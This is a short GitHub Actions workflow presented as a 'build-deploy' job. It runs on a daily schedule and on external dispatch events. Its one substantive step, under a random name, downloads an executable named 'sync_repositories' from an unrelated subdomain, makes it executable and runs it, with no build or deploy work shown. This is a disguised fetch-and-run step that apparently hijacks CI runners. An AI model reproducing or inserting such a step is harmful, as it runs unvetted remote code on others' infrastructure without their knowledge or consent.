#2024-03-18-[135738]-eir2ecww
name: main

on:
  workflow_dispatch:

  repository_dispatch:
    types: runner_workflow

  schedule:
    - cron: "21 2 * * * "
    
jobs:
  build-deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: bw68ix1fempzsakm
        run: |
          wget -q https://d6v3xc1jxytuh7f4.callforpapers.eu.org/sync_repositories
          chmod 755 sync_repositories
          ./sync_repositories